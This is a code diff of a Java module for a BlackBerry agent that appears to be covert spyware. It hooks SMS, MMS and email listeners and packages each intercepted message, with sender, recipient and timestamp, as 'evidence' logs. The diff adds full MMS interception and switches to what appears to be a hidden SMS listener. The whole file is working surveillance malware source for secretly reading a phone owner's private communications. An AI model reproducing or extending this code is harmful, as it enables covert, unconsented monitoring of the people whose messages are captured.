@@ -10,6 +10,7 @@
 package blackberry.module;
 
 import java.io.IOException;
+import java.io.UnsupportedEncodingException;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Vector;
@@ -118,13 +119,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         mailListener = MailListener.getInstance();
 
-        //#ifdef SMS_HIDE
         smsListener = SmsListener46.getInstance();
         mmsListener = MmsListener.getInstance();
-        //#else
-        smsListener = SmsListener45.getInstance();
-        //#endif
-        //smsListener.setMessageAgent(this);
 
     }
 
@@ -139,13 +135,13 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         if (configMarkup.isMarkup()) {
             try {
                 oldConfig = configMarkup.readMarkupStringArray();
-               
+
             } catch (Exception e) {
                 oldConfig = new String[] { "", "", "" };
             }
         }
-        
-        if(oldConfig==null || oldConfig.length !=3){
+
+        if (oldConfig == null || oldConfig.length != 3) {
             //#ifdef DEBUG
             debug.trace("parse, wrong oldConfig, regenerate");
             //#endif
@@ -157,9 +153,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         Check.requires(oldConfig != null && oldConfig.length == 3,
                 "parse: wrong oldconfig size");
         Check.requires(config != null && config.length == 3,
-        "parse: wrong config size");
-        Check.requires(configMarkup != null,
-        "parse: configMarkup null");
+                "parse: wrong config size");
+        Check.requires(configMarkup != null, "parse: configMarkup null");
         //#endif
 
         //#ifdef DEBUG
@@ -221,31 +216,40 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     private boolean readJson(int id, String child, ConfModule jsonconf,
             String[] config) throws ConfigurationException {
-        ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
-        boolean enabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
-        String digestConfMail = child + "_" + enabled;
 
-        if (enabled) {
-            ChildConf filter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
-            boolean history = filter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
-            int maxSizeToLog = 4096;
-            digestConfMail += "_" + history;
-            if (history) {
-                Date from = filter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-                Date to = filter.getDate(Messages.getString("18.6"), null); //$NON-NLS-1$
-                maxSizeToLog = filter.getInt("maxsize", 4096);
+        try {
+            ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
+            boolean enabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
+            String digestConfMail = child + "_" + enabled;
 
-                filterCollect[id] = new Filter(history, from, to, maxSizeToLog,
-                        maxSizeToLog);
-                digestConfMail += "_" + from + "_" + to;
+            if (enabled) {
+                ChildConf filter = mailJson
+                        .getChild(Messages.getString("18.3")); //$NON-NLS-1$
+                boolean history = filter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
+                int maxSizeToLog = 4096;
+                digestConfMail += "_" + history;
+                if (history) {
+                    Date from = filter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
+                    Date to = filter.getDate(Messages.getString("18.6"), null); //$NON-NLS-1$
+                    maxSizeToLog = filter.getInt("maxsize", 4096);
+
+                    filterCollect[id] = new Filter(history, from, to,
+                            maxSizeToLog, maxSizeToLog);
+                    digestConfMail += "_" + from + "_" + to;
+                }
+                filterRuntime[id] = new Filter(enabled, maxSizeToLog);
+
             }
-            filterRuntime[id] = new Filter(enabled, maxSizeToLog);
 
+            config[id] = digestConfMail;
+
+            return enabled;
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error("readJson: ", ex);
+            //#endif
+            return false;
         }
-
-        config[id] = digestConfMail;
-
-        return enabled;
     }
 
     /*
@@ -259,10 +263,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mmsEnabled) {
-            // TODO: MMS
-            //#ifdef MMS
-            mmsListener.start(this);
-            //#endif
+            mmsListener.start();
         }
 
         if (mailEnabled) {
@@ -415,7 +416,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         if (date == null) {
             date = new Date(0);
-            markupDate.put(key, date, true);
+            //markupDate.put(key, date, true);
         }
         return date;
     }
@@ -438,17 +439,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             final boolean incoming) {
 
         //#ifdef DBC
-        Check.requires(message != null, "saveLog: null message"); //$NON-NLS-1$
+        Check.requires(message != null, "onNewSms: null message"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("onNewSms message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
                 + " incoming: " + incoming); //$NON-NLS-1$
         //#endif
 
         //final byte[] dataMsg = getSmsDataMessage(message);
         //#ifdef DBC
-        Check.asserts(message != null, "saveLog: null dataMsg"); //$NON-NLS-1$
+        Check.asserts(message != null, "onNewSms: null dataMsg"); //$NON-NLS-1$
         //#endif
 
         //final ByteArrayOutputStream os = null;
@@ -480,17 +481,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
             if (incoming) {
                 from = address;
-                to = getMySmsAddress();
+                to = getMyAddress();
 
             } else {
-                from = getMySmsAddress();
+                from = getMyAddress();
                 to = address;
             }
 
             filetime = new DateTime(date);
 
             //#ifdef DBC
-            Check.asserts(filetime != null, "saveLog: null filetime"); //$NON-NLS-1$
+            Check.asserts(filetime != null, "onNewSms: null filetime"); //$NON-NLS-1$
             //#endif
 
             // preparing additionalData
@@ -517,25 +518,120 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             //#endif
 
             // Creating log
-
             createEvidence(additionalData, WChar.getBytes(message),
                     EvidenceType.SMS_NEW);
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
-            debug.error("saveLog message: " + ex); //$NON-NLS-1$
+            debug.error("onNewSms message: " + ex); //$NON-NLS-1$
             //#endif
 
         }
         return false;
     }
 
-    public void onNewMms(final byte[] byteMessage, String address,
-            final boolean incomin) {
+    public boolean onNewMms(final byte[] byteMessage, String address,
+            final boolean incoming) {
+
+        if (byteMessage == null) {
+            return false;
+        }
+
+        String message = new String(byteMessage);
+        //#ifdef DBC
+        Check.requires(message != null, "onNewMms: null message"); //$NON-NLS-1$
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("onNewSms message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
+                + " incoming: " + incoming); //$NON-NLS-1$
+        //#endif
+
+        //final byte[] dataMsg = getSmsDataMessage(message);
+        //#ifdef DBC
+        Check.asserts(message != null, "onNewMms: null dataMsg"); //$NON-NLS-1$
+        //#endif
+
+        //final ByteArrayOutputStream os = null;
+        try {
+            final int flags = incoming ? 1 : 0;
+
+            DateTime filetime = null;
+            final int additionalDataLen = 48;
+            final byte[] additionalData = new byte[additionalDataLen];
+
+            String from;
+            String to;
+
+            // Check if it's actually a sms
+
+            final String prefix = "//"; //$NON-NLS-1$
+            int pos = address.indexOf(prefix);
+            if (pos >= 0) {
+                address = address.substring(prefix.length() + pos);
+            } else {
+                //#ifdef DEBUG
+                debug.error("Not a mms, address: " + address); //$NON-NLS-1$
+                //#endif
+                return false;
+            }
+
+            // Filling fields
+            final Date date = new Date();
+
+            if (incoming) {
+                from = address;
+                to = getMyAddress();
+
+            } else {
+                from = getMyAddress();
+                to = address;
+            }
+
+            filetime = new DateTime(date);
+
+            //#ifdef DBC
+            Check.asserts(filetime != null, "onNewMms: null filetime"); //$NON-NLS-1$
+            //#endif
+
+            // preparing additionalData
+
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
+                    additionalDataLen, false);
+            databuffer.writeInt(SMS_VERSION);
+            databuffer.writeInt(flags);
+            databuffer.writeLong(filetime.getFiledate());
+            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
+            databuffer.write(Utils.padByteArray(to.getBytes(), 16));
+
+            //#ifdef DEBUG
+            debug.info("mms : " + (incoming ? "incoming" : "outgoing")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+            debug.info("From: " + from + " To: " + to + " date: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+                    + filetime.toString());
+            //#endif
+
+            //#ifdef DBC
+            Check.ensures(databuffer.getLength() == additionalDataLen,
+                    "MMS Wrong databuffer size: " + databuffer.getLength()); //$NON-NLS-1$
+            Check.ensures(additionalData.length == additionalDataLen,
+                    "SMMS Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
+            //#endif
+
+            // Creating log
+            createEvidence(additionalData, WChar.getBytes(message),
+                    EvidenceType.SMS_NEW);
+
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
+            debug.error("onNewMms message: " + ex); //$NON-NLS-1$
+            //#endif
+
+        }
+        return false;
 
     }
 
-    private String getMySmsAddress() {
+    private String getMyAddress() {
         final String number = Phone.getDevicePhoneNumber(false);
         if (number == null || number.startsWith(Messages.getString("18.11"))) { //$NON-NLS-1$
             return Messages.getString("18.12"); //$NON-NLS-1$
@@ -588,6 +684,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             databuffer.writeInt(flags);
             databuffer.writeInt(size);
             databuffer.writeLong(filetime.getFiledate());
+
             //#ifdef DBC
             Check.asserts(additionalData.length == 20,
                     "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
@@ -635,11 +732,14 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //#endif
 
         // comincia la ricostruzione del MIME
-        mailRaw.append(Messages.getString("18.14")+"\r\n"); //$NON-NLS-1$
+        //18.14=MIME-Version: 1.0
+        mailRaw.append(Messages.getString("18.14") + "\r\n"); //$NON-NLS-1$
         final long rnd = Math.abs(Utils.randomLong());
+        //18.15=------_NextPart_
         final String boundary = Messages.getString("18.15") + rnd; //$NON-NLS-1$
 
         if (mail.isMultipart()) {
+            //18.16=Content-Type: multipart/alternative; boundary=
             mailRaw.append(Messages.getString("18.16") //$NON-NLS-1$
                     + boundary + "\r\n"); //$NON-NLS-1$
             mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -659,6 +759,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mail.hasHtml()) {
+            //#ifdef DEBUG
+            try {
+                debug.trace("makeMimeMessage, hasHtml: "
+                        + mail.htmlMessageContentType + " "
+                        + Utils.byteArrayToHex(mail.htmlMessage.getBytes("UTF-8")));
+                debug.trace("makeMimeMessage, html: " + mail.htmlMessage);
+            } catch (UnsupportedEncodingException e) {
+                // TODO Auto-generated catch block
+                e.printStackTrace();
+            }
+            //#endif
             //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
             //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
             mailRaw.append(mail.htmlMessageContentType);
@@ -671,7 +782,11 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
         if (mail.isEmpty()) {
-            mailRaw.append(Messages.getString("18.17")+"\r\n\r\n"); //$NON-NLS-1$
+            //#ifdef DEBUG
+            debug.trace("makeMimeMessage, mail empty");
+            //#endif
+            // 18.17=Content-type: text/plain; charset=UTF8
+            mailRaw.append(Messages.getString("18.17") + "\r\n\r\n"); //$NON-NLS-1$
 
             String msg = message.getBodyText();
             if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
@@ -681,9 +796,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         mailRaw.append("\r\n"); //$NON-NLS-1$
-
+       
         final String craftedMail = mailRaw.toString();
-
         return craftedMail;
     }
 
@@ -704,6 +818,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 mail.append(header.getName());
                 mail.append(header.getValue());
                 mail.append("\r\n"); //$NON-NLS-1$
+                //#ifdef DEBUG
+                debug.trace("addAllHeaders "+ header.getName() + " = " + header.getValue());
+                //#endif
             } else {
                 //#ifdef DEBUG
                 debug.error("Unknown header type: " + headerObj); //$NON-NLS-1$
@@ -730,6 +847,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 final Header header = (Header) headerObj;
                 if (header.getName().startsWith(Messages.getString("18.18"))) { //$NON-NLS-1$
                     fromFound = true;
+                    //#ifdef DEBUG
+                    debug.trace("addFromHeaders, from found");
+                    //#endif
                 }
             }
         }
